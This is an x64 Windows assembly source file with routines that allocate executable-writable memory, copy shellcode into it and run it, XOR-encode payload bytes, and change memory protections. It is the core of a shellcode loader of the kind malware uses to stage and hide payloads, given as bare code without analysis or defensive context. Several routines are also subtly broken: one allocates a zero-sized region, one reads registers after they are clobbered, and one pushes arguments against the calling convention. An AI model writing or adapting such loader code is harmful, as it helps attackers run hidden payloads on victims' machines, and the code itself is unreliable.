BITS 64

section .text

global Shellcode_ExecuteAsm
global Shellcode_AllocateAsm
global Shellcode_XORAsm
global Shellcode_ProtectAsm

; Shellcode_ExecuteAsm - Execute shellcode
; Parameters: shellcode (rcx), size (rdx)
; Returns: BOOL
Shellcode_ExecuteAsm:
    push rbp
    mov rbp, rsp
    
    push rbx
    push rsi
    push rdi
    
    mov rbx, rcx
    mov rcx, rdx
    
    ; Allocate memory
    push rcx
    push rbx
    call Shellcode_AllocateAsm
    pop rbx
    pop rcx
    test rax, rax
    jz .error
    
    ; Copy shellcode
    mov rdi, rax
    mov rsi, rbx
    mov rcx, rdx
    rep movsb
    
    ; Execute shellcode
    call rax
    
    ; Free memory
    push rax
    mov rcx, rdi
    mov rdx, rbx
    call Shellcode_FreeAsm
    pop rax
    
    mov rax, 1
    jmp .done

.error:
    xor rax, rax

.done:
    pop rdi
    pop rsi
    pop rbx
    pop rbp
    ret

; Shellcode_AllocateAsm - Allocate memory
; Parameters: size (rcx)
; Returns: memory address
Shellcode_AllocateAsm:
    push rbp
    mov rbp, rsp
    
    ; Use VirtualAlloc
    mov rax, [rel g_VirtualAlloc]
    test rax, rax
    jz .error
    
    ; VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    mov rcx, 0
    mov rdx, rcx
    mov r8, 0x3000
    mov r9, 0x40
    call rax
    
    jmp .done

.error:
    xor rax, rax

.done:
    pop rbp
    ret

; Shellcode_FreeAsm - Free memory
; Parameters: addr (rcx), size (rdx)
Shellcode_FreeAsm:
    push rbp
    mov rbp, rsp
    
    ; Use VirtualFree
    mov rax, [rel g_VirtualFree]
    test rax, rax
    jz .error
    
    ; VirtualFree(addr, 0, MEM_RELEASE)
    mov rcx, rdx
    mov rdx, 0
    mov r8, 0x8000
    call rax
    
.error:
    pop rbp
    ret

; Shellcode_XORAsm - XOR encryption
; Parameters: data (rcx), size (rdx), key (r8)
Shellcode_XORAsm:
    push rbp
    mov rbp, rsp
    
    push rbx
    
    mov rbx, rcx
    xor rcx, rcx
    
.xor_loop:
    cmp rcx, rdx
    jge .done
    
    xor byte [rbx + rcx], r8b
    inc rcx
    jmp .xor_loop

.done:
    pop rbx
    pop rbp
    ret

; Shellcode_ProtectAsm - Change memory protection
; Parameters: addr (rcx), size (rdx), protection (r8)
; Returns: BOOL
Shellcode_ProtectAsm:
    push rbp
    mov rbp, rsp
    
    ; Use VirtualProtect
    mov rax, [rel g_VirtualProtect]
    test rax, rax
    jz .error
    
    ; VirtualProtect(addr, size, protection, &old_protect)
    sub rsp, 8
    lea r9, [rsp]
    push r9
    push r8
    push rdx
    push rcx
    call rax
    add rsp, 32
    
    jmp .done

.error:
    xor rax, rax

.done:
    pop rbp
    ret

section .data
g_VirtualAlloc dq 0
g_VirtualFree dq 0
g_VirtualProtect dq 0